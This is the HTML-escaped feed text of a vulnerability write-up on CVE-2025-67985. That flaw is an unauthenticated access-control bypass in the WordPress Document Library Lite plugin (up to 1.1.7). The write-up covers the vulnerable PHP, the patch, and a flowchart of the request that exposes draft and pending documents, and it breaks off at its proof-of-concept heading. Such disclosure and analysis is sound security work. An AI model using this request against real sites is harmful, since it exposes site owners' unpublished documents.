      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;A vulnerability involving &lt;strong&gt;authorization bypass via user-controlled keys&lt;/strong&gt; in the &lt;strong&gt;Document Library Lite&lt;/strong&gt; plugin by &lt;strong&gt;Barn2 Plugins&lt;/strong&gt; allows exploitation of &lt;strong&gt;misconfigured access control security levels&lt;/strong&gt;.&#xA;This vulnerability affects &lt;strong&gt;Document Library Lite&lt;/strong&gt; from &lt;strong&gt;unknown versions&lt;/strong&gt; up to &lt;strong&gt;version 1.1.7 and below&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-67985&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-67985&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure direct object references (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/document-library-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Document Library Lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The vulnerability is officially disclosed as affecting versions up to 1.1.7, but in reality it was already patched in version 1.1.7. We download version 1.1.6 for analysis.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_dll_load_posts&amp;#39;, [ $this, &amp;#39;load_posts&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook available to all users (including unauthenticated users). Anyone can call the AJAX action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=dll_load_posts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And execute the &lt;code&gt;load_posts()&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const SHORTCODE = &amp;#39;doc_library&amp;#39;;&#xA;public function load_posts() {&#xA;    $args = Options::handle_shortcode_attribute_aliases( $_POST[ &amp;#39;args&amp;#39; ] );&#xA;    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&#xA;&#xA;    $table = new simple_Document_Library( $args );&#xA;    $response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&#xA;&#xA;    // Return the response as JSON&#xA;    wp_send_json($response);   &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;load_posts()&lt;/code&gt; function calls &lt;code&gt;handle_shortcode_attribute_aliases&lt;/code&gt; with user input from &lt;code&gt;$_POST[&#39;args&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function handle_shortcode_attribute_aliases( $atts ) {&#xA;    if ( isset( $atts[&amp;#39;content&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;columns&amp;#39;] = $atts[&amp;#39;content&amp;#39;];&#xA;        unset( $atts[&amp;#39;content&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( isset( $atts[&amp;#39;docs_per_page&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;rows_per_page&amp;#39;] = $atts[&amp;#39;docs_per_page&amp;#39;];&#xA;        unset( $atts[&amp;#39;docs_per_page&amp;#39;] );&#xA;    }&#xA;&#xA;    return $atts;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only performs parameter mapping (renaming):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;content&lt;/code&gt; → &lt;code&gt;columns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;docs_per_page&lt;/code&gt; → &lt;code&gt;rows_per_page&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Then returns the &lt;code&gt;$atts&lt;/code&gt; array.&lt;/p&gt;&#xA;&lt;p&gt;Next, &lt;code&gt;load_posts()&lt;/code&gt; calls:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;to merge default parameters (&lt;code&gt;Options::get_defaults()&lt;/code&gt;) with user-supplied &lt;code&gt;$args&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#34; title=&#34;Default shortcode options&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;Default shortcode options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#39; alt=&#34;Option&#34; height=&#34;475&#34; width=&#34;669&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default shortcode options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Among them, &lt;code&gt;status&lt;/code&gt; determines which document statuses are displayed.&lt;/p&gt;&#xA;&lt;p&gt;Document status can be changed when creating/editing a document:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#34; title=&#34;Change status&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Status&lt;/h2&gt;&lt;p&gt;Change status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#39; alt=&#34;Status&#34; height=&#34;581&#34; width=&#34;1518&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;pending&lt;/code&gt; and &lt;code&gt;draft&lt;/code&gt; are non-public document statuses. Only users with sufficient privileges should be able to view them.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;load_posts()&lt;/code&gt; initializes &lt;code&gt;simple_Document_Library&lt;/code&gt; with user-controlled &lt;code&gt;$args&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$table = new simple_Document_Library( $args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validate_options()&lt;/code&gt; is called in the constructor of &lt;code&gt;simple_Document_Library&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct( $args ) {&#xA;    $this-&amp;gt;args = $this-&amp;gt;validate_options( $args );&#xA;    $this-&amp;gt;set_post_args();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, not only the three statuses &lt;code&gt;publish&lt;/code&gt;, &lt;code&gt;pending&lt;/code&gt;, and &lt;code&gt;draft&lt;/code&gt; exist, but also two additional statuses &lt;code&gt;future&lt;/code&gt; and &lt;code&gt;any&lt;/code&gt;, as seen in &lt;code&gt;validate_options()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function validate_options( $args ) {&#xA;    // Validate all the boolean options in the database&#xA;    $boolean_options = [ &amp;#39;lazy_load&amp;#39;, &amp;#39;lightbox&amp;#39;, &amp;#39;wrap&amp;#39;, &amp;#39;search_on_click&amp;#39; ];&#xA;&#xA;    foreach( $boolean_options as $option ) {&#xA;        $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === &amp;#34;true&amp;#34; : $args[ $option ];&#xA;    }&#xA;&#xA;    // The post status can only have these values&#xA;    $valid_post_statuses = [ &amp;#39;publish&amp;#39;, &amp;#39;pending&amp;#39;, &amp;#39;draft&amp;#39;, &amp;#39;future&amp;#39;, &amp;#39;any&amp;#39; ];&#xA;    $args[ &amp;#39;status&amp;#39; ] = in_array( $args[&amp;#39;status&amp;#39;], $valid_post_statuses ) ? $args[ &amp;#39;status&amp;#39; ] : &amp;#39;publish&amp;#39;;&#xA;    &#xA;    return $args;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only validates allowed values and does not perform any permission checks.&lt;/p&gt;&#xA;&lt;p&gt;Because &lt;code&gt;status&lt;/code&gt; allows &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt;, &lt;code&gt;future&lt;/code&gt;, and &lt;code&gt;any&lt;/code&gt;, a user can supply these values to view non-public documents → &lt;strong&gt;authorization bypass&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; is then called:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_table( $output_type = &amp;#39;html&amp;#39; ) {&#xA;    $columns = $this-&amp;gt;get_columns();&#xA;&#xA;    // Parse DataTables parameters from the AJAX request&#xA;    $draw   = isset( $_POST[&amp;#39;draw&amp;#39;] ) ? intval( $_POST[&amp;#39;draw&amp;#39;] ) : 1;&#xA;    $this-&amp;gt;args[&amp;#39;offset&amp;#39;]  = isset( $_POST[&amp;#39;start&amp;#39;] ) ? intval( $_POST[&amp;#39;start&amp;#39;] ) : 0;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = isset( $_POST[&amp;#39;length&amp;#39;] ) &amp;amp;&amp;amp; intval( $_POST[&amp;#39;length&amp;#39;] ) !== -1 ? intval( $_POST[&amp;#39;length&amp;#39;] ) : $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $columns[$_POST[&amp;#39;order&amp;#39;][0][&amp;#39;column&amp;#39;]] : $this-&amp;gt;get_orderby();&#xA;    $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $_POST[&amp;#39;order&amp;#39;][0][&amp;#39;dir&amp;#39;] : $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;search_value&amp;#39;] = isset( $_POST[&amp;#39;search&amp;#39;] ) ? $_POST[&amp;#39;search&amp;#39;][&amp;#39;value&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = filter_var( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] &amp;lt; 1 || ! $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] ) {&#xA;        $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = false;&#xA;    }&#xA;    if( isset( $_POST[&amp;#39;category&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;doc_category&amp;#39;] = $_POST[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;], Options::get_allowed_columns(), true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_by&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;], [ &amp;#39;asc&amp;#39;, &amp;#39;desc&amp;#39; ], true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_order&amp;#39;];&#xA;    }&#xA;&#xA;    // Set default sort direction&#xA;    if ( ! $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] ) {&#xA;        if ( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] === &amp;#39;date&amp;#39; ) {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;desc&amp;#39;;&#xA;        } else {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;asc&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    $this-&amp;gt;args[&amp;#39;content_length&amp;#39;]  = filter_var( $this-&amp;gt;args[&amp;#39;content_length&amp;#39;], FILTER_VALIDATE_INT );&#xA;    $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;]   = filter_var( $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( empty( $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] = Options::get_default_settings()[&amp;#39;date_format&amp;#39;];&#xA;    }&#xA;&#xA;    $output       = &amp;#39;&amp;#39;;&#xA;    $table_body   = &amp;#39;&amp;#39;;&#xA;    $body_row_fmt = &amp;#39;&amp;#39;;&#xA;&#xA;    // After an AJAX request, the paramaters should be set again&#xA;    $this-&amp;gt;set_post_args();&#xA;    // Get all published posts in the current language&#xA;    $all_posts = $this-&amp;gt;run_table_query( $this-&amp;gt;build_table_query( $this-&amp;gt;post_args ) );&#xA;&#xA;    // Bail early if no posts found&#xA;    if ( ! $all_posts || ! is_array( $all_posts ) ) {&#xA;        return $output;&#xA;    }&#xA;    &#xA;    // Add placeholder to table body format string so that content for this column is included in table output&#xA;    $cell_fmt     = &amp;#39;&amp;lt;td&amp;gt;{%s}&amp;lt;/td&amp;gt;&amp;#39;;&#xA;    $array_output = [];&#xA;    foreach ( $columns as $column ) {&#xA;        $body_row_fmt .= sprintf( $cell_fmt, $column );&#xA;    }&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        // Build table body&#xA;        $body_row_fmt = &amp;#39;&amp;lt;tr&amp;gt;&amp;#39; . $body_row_fmt . &amp;#39;&amp;lt;/tr&amp;gt;&amp;#39;;&#xA;&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;&#xA;            $post_data_trans = apply_filters(&#xA;                &amp;#39;document_library_table_row_data_format&amp;#39;,&#xA;                $this-&amp;gt;get_row_content( $_post )&#xA;            );&#xA;&#xA;            $table_body .= strtr( $body_row_fmt, $post_data_trans );&#xA;        } // foreach post&#xA;&#xA;        wp_reset_postdata();&#xA;        return $table_body;&#xA;    } else {&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;            $array_output[] = $this-&amp;gt;get_row_content( $_post );&#xA;        }&#xA;    }&#xA;&#xA;    // Increment the table count&#xA;    &amp;#43;&amp;#43;self::$table_count;&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        return apply_filters( &amp;#39;document_library_table_html_output&amp;#39;, $output, $this-&amp;gt;args );&#xA;    } else {&#xA;        $total_posts = $this-&amp;gt;get_total_posts();&#xA;&#xA;        // Prepare the response&#xA;        $response = [&#xA;            &amp;#39;draw&amp;#39;            =&amp;gt; $draw,&#xA;            &amp;#39;recordsTotal&amp;#39;    =&amp;gt; $total_posts,&#xA;            &amp;#39;recordsFiltered&amp;#39; =&amp;gt; $total_posts, // You can filter further if you add search functionality&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $array_output,&#xA;        ];&#xA;&#xA;        wp_send_json( $response );&#xA;&#xA;        // return &amp;#34;&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; reads multiple parameters directly from &lt;code&gt;$_POST&lt;/code&gt;, assigns them to &lt;code&gt;$this-&amp;gt;args&lt;/code&gt;, and uses them to build and execute document queries &lt;strong&gt;without checking user permissions&lt;/strong&gt;. Since the initial &lt;code&gt;$args&lt;/code&gt; (including &lt;code&gt;status&lt;/code&gt;) are client-controlled, users can query and retrieve documents with &lt;code&gt;pending&lt;/code&gt; or &lt;code&gt;draft&lt;/code&gt; status. The results are returned directly via JSON, leading to &lt;strong&gt;authorization bypass / IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Finally, &lt;code&gt;wp_send_json($response)&lt;/code&gt; &lt;strong&gt;returns the entire document data to the client&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_send_json($response);   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch fully mitigates the vulnerability by:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Forcing unauthenticated users to only view &lt;code&gt;publish&lt;/code&gt; documents&lt;/li&gt;&#xA;&lt;li&gt;Returning an &lt;code&gt;error&lt;/code&gt; if &lt;code&gt;status&lt;/code&gt; is not &lt;code&gt;publish&lt;/code&gt; and the user lacks the &lt;code&gt;edit_posts&lt;/code&gt; capability&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#39; alt=&#34;Patch&#34; height=&#34;612&#34; width=&#34;1519&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated user&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_dll_load_posts hook triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Ajax_Handler::load_posts()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Read user-controlled $_POST[&amp;#39;args&amp;#39;]&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Options::handle_shortcode_attribute_aliases()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Merge with default options via shortcode_atts()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Initialize simple_Document_Library($args)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;validate_options(): only validate value, no permission check&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;status accepted: publish/pending/draft/future/any&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build query using user-controlled status&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Query documents including non-public ones&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;get_table(&amp;#39;array&amp;#39;)&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;wp_send_json(response)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Non-public documents returned to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 